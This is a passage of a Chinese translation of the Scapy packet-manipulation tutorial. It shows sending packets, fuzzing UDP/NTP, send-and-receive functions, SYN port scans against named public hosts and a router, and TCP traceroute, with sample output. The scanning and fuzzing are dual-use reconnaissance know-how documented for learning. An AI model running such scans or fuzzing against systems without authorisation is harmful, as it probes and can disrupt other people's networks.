</tr>
</thead>
<tbody><tr>
<td>summary()</td>
<td align="center">显示一个关于每个数据包的摘要列表</td>
</tr>
<tr>
<td>nsummary()</td>
<td align="center">同上，但规定了数据包数量</td>
</tr>
<tr>
<td>conversations()</td>
<td align="center">显示一个会话图表</td>
</tr>
<tr>
<td>show()</td>
<td align="center">显示首选表示（通常用nsummary()）</td>
</tr>
<tr>
<td>filter()</td>
<td align="center">返回一个lambda过滤后的数据包列表</td>
</tr>
<tr>
<td>hexdump()</td>
<td align="center">返回所有数据包的一个hexdump</td>
</tr>
<tr>
<td>hexraw()</td>
<td align="center">返回所以数据包Raw layer的hexdump</td>
</tr>
<tr>
<td>padding()</td>
<td align="center">返回一个带填充的数据包的hexdump</td>
</tr>
<tr>
<td>nzpadding()</td>
<td align="center">返回一个具有非零填充的数据包的hexdump</td>
</tr>
<tr>
<td>plot()</td>
<td align="center">规划一个应用到数据包列表的lambda函数</td>
</tr>
<tr>
<td>make table()</td>
<td align="center">根据lambda函数来显示表格</td>
</tr>
</tbody></table>
<h3 id="Sending-packets"><a href="#Sending-packets" class="headerlink" title="Sending packets"></a>Sending packets</h3><p> 现在我们知道了如何处理数据包。让我们来看看如何发送它们。<code>send()</code>函数将会在第3层发送数据包。也就是说它会为你处理路由和第2层的数据。<code>sendp()</code>函数将会工作在第2层。选择合适的接口和正确的链路层协议都取决于你。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>send(IP(dst=<span class="string">"1.2.3.4"</span>)/ICMP())</span><br><span class="line">.</span><br><span class="line">Sent <span class="number">1</span> packets.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sendp(Ether()/IP(dst=<span class="string">"1.2.3.4"</span>,ttl=(<span class="number">1</span>,<span class="number">4</span>)), iface=<span class="string">"eth1"</span>)</span><br><span class="line">....</span><br><span class="line">Sent <span class="number">4</span> packets.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sendp(<span class="string">"I'm travelling on Ethernet"</span>, iface=<span class="string">"eth1"</span>, loop=<span class="number">1</span>, inter=<span class="number">0.2</span>)</span><br><span class="line">................^C</span><br><span class="line">Sent <span class="number">16</span> packets.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sendp(rdpcap(<span class="string">"/tmp/pcapfile"</span>)) <span class="comment"># tcpreplay</span></span><br><span class="line">...........</span><br><span class="line">Sent <span class="number">11</span> packets.</span><br><span class="line"></span><br><span class="line">Returns packets sent by send()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>send(IP(dst=<span class="string">'127.0.0.1'</span>), return_packets=<span class="literal">True</span>)</span><br><span class="line">.</span><br><span class="line">Sent <span class="number">1</span> packets.</span><br><span class="line">&lt;PacketList: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">1</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p> <code>fuzz()</code>函数可以通过一个具有随机值、数据类型合适的对象，来改变任何默认值，但该值不能是被计算的（像校验和那样）。这使得可以快速建立循环模糊化测试模板。在下面的例子中，IP层是正常的，UDP层和NTP层被fuzz。UDP的校验和是正确的，UDP的目的端口被NTP重载为123，而且NTP的版本被更变为4.其他所有的端口将被随机分组： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>send(IP(dst=<span class="string">"target"</span>)/fuzz(UDP()/NTP(version=<span class="number">4</span>)),loop=<span class="number">1</span>)</span><br><span class="line">................^C</span><br><span class="line">Sent <span class="number">16</span> packets.</span><br></pre></td></tr></table></figure>

<h3 id="Send-and-receive-packets-sr"><a href="#Send-and-receive-packets-sr" class="headerlink" title="Send and receive packets (sr)"></a>Send and receive packets (sr)</h3><p> 现在让我们做一些有趣的事情。<code>sr()</code>函数是用来发送数据包和接收应答。该函数返回一对数据包及其应答，还有无应答的数据包。<code>sr1()</code>函数是一种变体，用来返回一个应答数据包。发送的数据包必须是第3层报文（IP，ARP等）。<code>srp()</code>则是使用第2层报文（以太网，802.3等）。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = sr1(IP(dst=<span class="string">"www.slashdot.org"</span>)/ICMP()/<span class="string">"XXXXXXXXXXX"</span>)</span><br><span class="line">Begin emission:</span><br><span class="line">...Finished to send <span class="number">1</span> packets.</span><br><span class="line">.*</span><br><span class="line">Received <span class="number">5</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p</span><br><span class="line">&lt;IP version=<span class="number">4L</span> ihl=<span class="number">5L</span> tos=<span class="number">0x0</span> len=<span class="number">39</span> id=<span class="number">15489</span> flags= frag=<span class="number">0L</span> ttl=<span class="number">42</span> proto=ICMP</span><br><span class="line"> chksum=<span class="number">0x51dd</span> src=<span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span> dst=<span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span> options=<span class="string">''</span> |&lt;ICMP type=echo-reply</span><br><span class="line"> code=<span class="number">0</span> chksum=<span class="number">0xee45</span> id=<span class="number">0x0</span> seq=<span class="number">0x0</span> |&lt;Raw load=<span class="string">'XXXXXXXXXXX'</span></span><br><span class="line"> |&lt;Padding load=<span class="string">'\x00\x00\x00\x00'</span> |&gt;&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.show()</span><br><span class="line">---[ IP ]---</span><br><span class="line">version   = <span class="number">4L</span></span><br><span class="line">ihl       = <span class="number">5L</span></span><br><span class="line">tos       = <span class="number">0x0</span></span><br><span class="line">len       = <span class="number">39</span></span><br><span class="line">id        = <span class="number">15489</span></span><br><span class="line">flags     =</span><br><span class="line">frag      = <span class="number">0L</span></span><br><span class="line">ttl       = <span class="number">42</span></span><br><span class="line">proto     = ICMP</span><br><span class="line">chksum    = <span class="number">0x51dd</span></span><br><span class="line">src       = <span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span></span><br><span class="line">dst       = <span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span></span><br><span class="line">options   = <span class="string">''</span></span><br><span class="line">---[ ICMP ]---</span><br><span class="line">   type      = echo-reply</span><br><span class="line">   code      = <span class="number">0</span></span><br><span class="line">   chksum    = <span class="number">0xee45</span></span><br><span class="line">   id        = <span class="number">0x0</span></span><br><span class="line">   seq       = <span class="number">0x0</span></span><br><span class="line">---[ Raw ]---</span><br><span class="line">      load      = <span class="string">'XXXXXXXXXXX'</span></span><br><span class="line">---[ Padding ]---</span><br><span class="line">         load      = <span class="string">'\x00\x00\x00\x00'</span></span><br></pre></td></tr></table></figure>

<p> DNS查询（<code>rd</code> = recursion desired）。主机192.168.5.1是我的DNS服务器。注意从我Linksys来的非空填充具有Etherleak缺陷： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sr1(IP(dst=<span class="string">"192.168.5.1"</span>)/UDP()/DNS(rd=<span class="number">1</span>,qd=DNSQR(qname=<span class="string">"www.slashdot.org"</span>)))</span><br><span class="line">Begin emission:</span><br><span class="line">Finished to send <span class="number">1</span> packets.</span><br><span class="line">..*</span><br><span class="line">Received <span class="number">3</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets</span><br><span class="line">&lt;IP version=<span class="number">4L</span> ihl=<span class="number">5L</span> tos=<span class="number">0x0</span> len=<span class="number">78</span> id=<span class="number">0</span> flags=DF frag=<span class="number">0L</span> ttl=<span class="number">64</span> proto=UDP chksum=<span class="number">0xaf38</span></span><br><span class="line"> src=<span class="number">192.168</span><span class="number">.5</span><span class="number">.1</span> dst=<span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span> options=<span class="string">''</span> |&lt;UDP sport=<span class="number">53</span> dport=<span class="number">53</span> len=<span class="number">58</span> chksum=<span class="number">0xd55d</span></span><br><span class="line"> |&lt;DNS id=<span class="number">0</span> qr=<span class="number">1L</span> opcode=QUERY aa=<span class="number">0L</span> tc=<span class="number">0L</span> rd=<span class="number">1L</span> ra=<span class="number">1L</span> z=<span class="number">0L</span> rcode=ok qdcount=<span class="number">1</span> ancount=<span class="number">1</span></span><br><span class="line"> nscount=<span class="number">0</span> arcount=<span class="number">0</span> qd=&lt;DNSQR qname=<span class="string">'www.slashdot.org.'</span> qtype=A qclass=IN |&gt;</span><br><span class="line"> an=&lt;DNSRR rrname=<span class="string">'www.slashdot.org.'</span> type=A rclass=IN ttl=<span class="number">3560L</span> rdata=<span class="string">'66.35.250.151'</span> |&gt;</span><br><span class="line"> ns=<span class="number">0</span> ar=<span class="number">0</span> |&lt;Padding load=<span class="string">'\xc6\x94\xc7\xeb'</span> |&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p> 发送和接收函数族是scapy中的核心部分。它们返回一对两个列表。第一个就是发送的数据包及其应答组成的列表，第二个是无应答数据包组成的列表。为了更好地呈现它们，它们被封装成一个对象，并且提供了一些便于操作的方法： </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sr(IP(dst=<span class="string">"192.168.8.1"</span>)/TCP(dport=[<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>]))</span><br><span class="line">Received <span class="number">6</span> packets, got <span class="number">3</span> answers, remaining <span class="number">0</span> packets</span><br><span class="line">(&lt;Results: UDP:<span class="number">0</span> TCP:<span class="number">3</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;, &lt;Unanswered: UDP:<span class="number">0</span> TCP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = _</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary()</span><br><span class="line">IP / TCP 192.168.8.14:20 &gt; 192.168.8.1:21 S ==&gt; Ether / IP / TCP 192.168.8.1:21 &gt; 192.168.8.14:20 RA / Padding</span><br><span class="line">IP / TCP 192.168.8.14:20 &gt; 192.168.8.1:22 S ==&gt; Ether / IP / TCP 192.168.8.1:22 &gt; 192.168.8.14:20 RA / Padding</span><br><span class="line">IP / TCP 192.168.8.14:20 &gt; 192.168.8.1:23 S ==&gt; Ether / IP / TCP 192.168.8.1:23 &gt; 192.168.8.14:20 RA / Padding</span><br></pre></td></tr></table></figure>

<p> 如果对于应答数据包有速度限制，你可以通过<code>inter</code>参数来设置两个数据包之间等待的时间间隔。如果有些数据包丢失了，或者设置时间间隔不足以满足要求，你可以重新发送所有无应答数据包。你可以简单地对无应答数据包列表再调用一遍函数，或者去设置<code>retry</code>参数。如果retry设置为3，scapy会对无应答的数据包重复发送三次。如果retry设为-3，scapy则会一直发送无应答的数据包，直到。<code>timeout</code>参数设置在最后一个数据包发出去之后的等待时间： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sr(IP(dst=<span class="string">"172.20.29.5/30"</span>)/TCP(dport=[<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>]),inter=<span class="number">0.5</span>,retry=<span class="number">-2</span>,timeout=<span class="number">1</span>)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished to send <span class="number">12</span> packets.</span><br><span class="line">Begin emission:</span><br><span class="line">Finished to send <span class="number">9</span> packets.</span><br><span class="line">Begin emission:</span><br><span class="line">Finished to send <span class="number">9</span> packets.</span><br><span class="line"></span><br><span class="line">Received <span class="number">100</span> packets, got <span class="number">3</span> answers, remaining <span class="number">9</span> packets</span><br><span class="line">(&lt;Results: UDP:<span class="number">0</span> TCP:<span class="number">3</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;, &lt;Unanswered: UDP:<span class="number">0</span> TCP:<span class="number">9</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;)</span><br></pre></td></tr></table></figure>

<h3 id="SYN-Scans"><a href="#SYN-Scans" class="headerlink" title="SYN Scans"></a>SYN Scans</h3><p> 在Scapy提示符中执行一下命令，可以对经典的SYN Scan初始化： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sr1(IP(dst=<span class="string">"72.14.207.99"</span>)/TCP(dport=<span class="number">80</span>,flags=<span class="string">"S"</span>))</span><br></pre></td></tr></table></figure>

<p> 以上向Google的80端口发送了一个SYN数据包，会在接收到一个应答后退出： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Begin emission:</span><br><span class="line">.Finished to send <span class="number">1</span> packets.</span><br><span class="line">*</span><br><span class="line">Received <span class="number">2</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets</span><br><span class="line">&lt;IP  version=<span class="number">4L</span> ihl=<span class="number">5L</span> tos=<span class="number">0x20</span> len=<span class="number">44</span> id=<span class="number">33529</span> flags= frag=<span class="number">0L</span> ttl=<span class="number">244</span></span><br><span class="line">proto=TCP chksum=<span class="number">0x6a34</span> src=<span class="number">72.14</span><span class="number">.207</span><span class="number">.99</span> dst=<span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> options=// |</span><br><span class="line">&lt;TCP  sport=www dport=ftp-data seq=<span class="number">2487238601L</span> ack=<span class="number">1</span> dataofs=<span class="number">6L</span> reserved=<span class="number">0L</span></span><br><span class="line">flags=SA window=<span class="number">8190</span> chksum=<span class="number">0xcdc7</span> urgptr=<span class="number">0</span> options=[(<span class="string">'MSS'</span>, <span class="number">536</span>)] |</span><br><span class="line">&lt;Padding  load=<span class="string">'V\xf7'</span> |&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>从以上的输出中可以看出，Google返回了一个SA（SYN-ACK）标志位，表示80端口是open的。</p>
<p>使用其他标志位扫描一下系统的440到443端口：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sr(IP(dst=<span class="string">"192.168.1.1"</span>)/TCP(sport=<span class="number">666</span>,dport=(<span class="number">440</span>,<span class="number">443</span>),flags=<span class="string">"S"</span>))</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sr(IP(dst=<span class="string">"192.168.1.1"</span>)/TCP(sport=RandShort(),dport=[<span class="number">440</span>,<span class="number">441</span>,<span class="number">442</span>,<span class="number">443</span>],flags=<span class="string">"S"</span>))</span><br></pre></td></tr></table></figure>

<p> 可以对收集的数据包进行摘要（summary），来快速地浏览响应： </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = _</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary()</span><br><span class="line">IP / TCP 192.168.1.100:ftp-data &gt; 192.168.1.1:440 S ======&gt; IP / TCP 192.168.1.1:440 &gt; 192.168.1.100:ftp-data RA / Padding</span><br><span class="line">IP / TCP 192.168.1.100:ftp-data &gt; 192.168.1.1:441 S ======&gt; IP / TCP 192.168.1.1:441 &gt; 192.168.1.100:ftp-data RA / Padding</span><br><span class="line">IP / TCP 192.168.1.100:ftp-data &gt; 192.168.1.1:442 S ======&gt; IP / TCP 192.168.1.1:442 &gt; 192.168.1.100:ftp-data RA / Padding</span><br><span class="line">IP / TCP 192.168.1.100:ftp-data &gt; 192.168.1.1:https S ======&gt; IP / TCP 192.168.1.1:https &gt; 192.168.1.100:ftp-data SA / Padding</span><br></pre></td></tr></table></figure>

<p> 以上显示了我们在扫描过程中的请求应答对。我们也可以用一个循环只显示我们感兴趣的信息： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary( <span class="keyword">lambda</span>(s,r): r.sprintf(<span class="string">"%TCP.sport% \t %TCP.flags%"</span>) )</span><br><span class="line"><span class="number">440</span>      RA</span><br><span class="line"><span class="number">441</span>      RA</span><br><span class="line"><span class="number">442</span>      RA</span><br><span class="line">https    SA</span><br></pre></td></tr></table></figure>

<p> 可以使用<code>make_table()</code>函数建立一个表格，更好地显示多个目标信息： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=[<span class="string">"192.168.1.1"</span>,<span class="string">"yahoo.com"</span>,<span class="string">"slashdot.org"</span>])/TCP(dport=[<span class="number">22</span>,<span class="number">80</span>,<span class="number">443</span>],flags=<span class="string">"S"</span>))</span><br><span class="line">Begin emission:</span><br><span class="line">.......*.**.......Finished to send <span class="number">9</span> packets.</span><br><span class="line">**.*.*..*..................</span><br><span class="line">Received <span class="number">362</span> packets, got <span class="number">8</span> answers, remaining <span class="number">1</span> packets</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.make_table(</span><br><span class="line"><span class="meta">... </span>   <span class="keyword">lambda</span>(s,r): (s.dst, s.dport,</span><br><span class="line"><span class="meta">... </span>   r.sprintf(<span class="string">"&#123;TCP:%TCP.flags%&#125;&#123;ICMP:%IP.src% - %ICMP.type%&#125;"</span>)))</span><br><span class="line">    <span class="number">66.35</span><span class="number">.250</span><span class="number">.150</span>                <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">216.109</span><span class="number">.112</span><span class="number">.135</span></span><br><span class="line"><span class="number">22</span>  <span class="number">66.35</span><span class="number">.250</span><span class="number">.150</span> - dest-unreach RA          -</span><br><span class="line"><span class="number">80</span>  SA                           RA          SA</span><br><span class="line"><span class="number">443</span> SA                           SA          SA</span><br></pre></td></tr></table></figure>

<p>在以上的例子中，如果接收到作为响应的ICMP数据包而不是预期的TCP数据包，就会打印出ICMP差错类型（error type）。</p>
<p>对于更大型的扫描，我们可能对某个响应感兴趣，下面的例子就只显示设置了”SA”标志位的数据包：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.nsummary(lfilter = <span class="keyword">lambda</span> (s,r): r.sprintf(<span class="string">"%TCP.flags%"</span>) == <span class="string">"SA"</span>)</span><br><span class="line">0003 IP / TCP 192.168.1.100:ftp_data &gt; 192.168.1.1:https S ======&gt; IP / TCP 192.168.1.1:https &gt; 192.168.1.100:ftp_data SA</span><br></pre></td></tr></table></figure>

<p>I如果我们想对响应进行专业分析，我们可以使用使用以下的命令显示哪些端口是open的： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary(lfilter = <span class="keyword">lambda</span> (s,r): r.sprintf(<span class="string">"%TCP.flags%"</span>) == <span class="string">"SA"</span>,prn=<span class="keyword">lambda</span>(s,r):r.sprintf(<span class="string">"%TCP.sport% is open"</span>))</span><br><span class="line">https <span class="keyword">is</span> open</span><br></pre></td></tr></table></figure>

<p> 对于更大型的扫描，我们可以建立一个端口开放表： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.filter(<span class="keyword">lambda</span> (s,r):TCP <span class="keyword">in</span> r <span class="keyword">and</span> r[TCP].flags&amp;<span class="number">2</span>).make_table(<span class="keyword">lambda</span> (s,r):</span><br><span class="line"><span class="meta">... </span>            (s.dst, s.dport, <span class="string">"X"</span>))</span><br><span class="line">    <span class="number">66.35</span><span class="number">.250</span><span class="number">.150</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">216.109</span><span class="number">.112</span><span class="number">.135</span></span><br><span class="line"><span class="number">80</span>  X             -           X</span><br><span class="line"><span class="number">443</span> X             X           X</span><br></pre></td></tr></table></figure>

<p> 如果以上的方法还不够，Scapy还包含一个<code>report_ports()</code>函数，该函数不仅可以自动化SYN scan，而且还会对收集的结果以LaTeX形式输出： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>report_ports(<span class="string">"192.168.1.1"</span>,(<span class="number">440</span>,<span class="number">443</span>))</span><br><span class="line">Begin emission:</span><br><span class="line">...*.**Finished to send <span class="number">4</span> packets.</span><br><span class="line">*</span><br><span class="line">Received <span class="number">8</span> packets, got <span class="number">4</span> answers, remaining <span class="number">0</span> packets</span><br><span class="line"><span class="string">'\\begin&#123;tabular&#125;&#123;|r|l|l|&#125;\n\\hline\nhttps &amp; open &amp; SA \\\\\n\\hline\n440</span></span><br><span class="line"><span class="string"> &amp; closed &amp; TCP RA \\\\\n441 &amp; closed &amp; TCP RA \\\\\n442 &amp; closed &amp;</span></span><br><span class="line"><span class="string">TCP RA \\\\\n\\hline\n\\hline\n\\end&#123;tabular&#125;\n'</span></span><br></pre></td></tr></table></figure>

<h3 id="TCP-traceroute"><a href="#TCP-traceroute" class="headerlink" title="TCP traceroute"></a>TCP traceroute</h3><p> TCP路由追踪： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=target, ttl=(<span class="number">4</span>,<span class="number">25</span>),id=RandShort())/TCP(flags=<span class="number">0x2</span>))</span><br><span class="line">*****.******.*.***..*.**Finished to send <span class="number">22</span> packets.</span><br><span class="line">***......</span><br><span class="line">Received <span class="number">33</span> packets, got <span class="number">21</span> answers, remaining <span class="number">1</span> packets</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> snd,rcv <span class="keyword">in</span> ans:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> snd.ttl, rcv.src, isinstance(rcv.payload, TCP)</span><br><span class="line">...</span><br><span class="line"><span class="number">5</span> <span class="number">194.51</span><span class="number">.159</span><span class="number">.65</span> <span class="number">0</span></span><br><span class="line"><span class="number">6</span> <span class="number">194.51</span><span class="number">.159</span><span class="number">.49</span> <span class="number">0</span></span><br><span class="line"><span class="number">4</span> <span class="number">194.250</span><span class="number">.107</span><span class="number">.181</span> <span class="number">0</span></span><br><span class="line"><span class="number">7</span> <span class="number">193.251</span><span class="number">.126</span><span class="number">.34</span> <span class="number">0</span></span><br><span class="line"><span class="number">8</span> <span class="number">193.251</span><span class="number">.126</span><span class="number">.154</span> <span class="number">0</span></span><br><span class="line"><span class="number">9</span> <span class="number">193.251</span><span class="number">.241</span><span class="number">.89</span> <span class="number">0</span></span><br><span class="line"><span class="number">10</span> <span class="number">193.251</span><span class="number">.241</span><span class="number">.110</span> <span class="number">0</span></span><br><span class="line"><span class="number">11</span> <span class="number">193.251</span><span class="number">.241</span><span class="number">.173</span> <span class="number">0</span></span><br><span class="line"><span class="number">13</span> <span class="number">208.172</span><span class="number">.251</span><span class="number">.165</span> <span class="number">0</span></span><br><span class="line"><span class="number">12</span> <span class="number">193.251</span><span class="number">.241</span><span class="number">.173</span> <span class="number">0</span></span><br><span class="line"><span class="number">14</span> <span class="number">208.172</span><span class="number">.251</span><span class="number">.165</span> <span class="number">0</span></span><br><span class="line"><span class="number">15</span> <span class="number">206.24</span><span class="number">.226</span><span class="number">.99</span> <span class="number">0</span></span><br><span class="line"><span class="number">16</span> <span class="number">206.24</span><span class="number">.238</span><span class="number">.34</span> <span class="number">0</span></span><br><span class="line"><span class="number">17</span> <span class="number">173.109</span><span class="number">.66</span><span class="number">.90</span> <span class="number">0</span></span><br><span class="line"><span class="number">18</span> <span class="number">173.109</span><span class="number">.88</span><span class="number">.218</span> <span class="number">0</span></span><br><span class="line"><span class="number">19</span> <span class="number">173.29</span><span class="number">.39</span><span class="number">.101</span> <span class="number">1</span></span><br><span class="line"><span class="number">20</span> <span class="number">173.29</span><span class="number">.39</span><span class="number">.101</span> <span class="number">1</span></span><br><span class="line"><span class="number">21</span> <span class="number">173.29</span><span class="number">.39</span><span class="number">.101</span> <span class="number">1</span></span><br><span class="line"><span class="number">22</span> <span class="number">173.29</span><span class="number">.39</span><span class="number">.101</span> <span class="number">1</span></span><br><span class="line"><span class="number">23</span> <span class="number">173.29</span><span class="number">.39</span><span class="number">.101</span> <span class="number">1</span></span><br><span class="line"><span class="number">24</span> <span class="number">173.29</span><span class="number">.39</span><span class="number">.101</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p> 注意：TCP路由跟踪和其他高级函数早已被构造好了： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lsc()</span><br><span class="line">sr               : Send <span class="keyword">and</span> receive packets at layer <span class="number">3</span></span><br><span class="line">sr1              : Send packets at layer <span class="number">3</span> <span class="keyword">and</span> <span class="keyword">return</span> only the first answer</span><br><span class="line">srp              : Send <span class="keyword">and</span> receive packets at layer <span class="number">2</span></span><br><span class="line">srp1             : Send <span class="keyword">and</span> receive packets at layer <span class="number">2</span> <span class="keyword">and</span> <span class="keyword">return</span> only the first answer</span><br><span class="line">srloop           : Send a packet at layer <span class="number">3</span> <span class="keyword">in</span> loop <span class="keyword">and</span> <span class="keyword">print</span> the 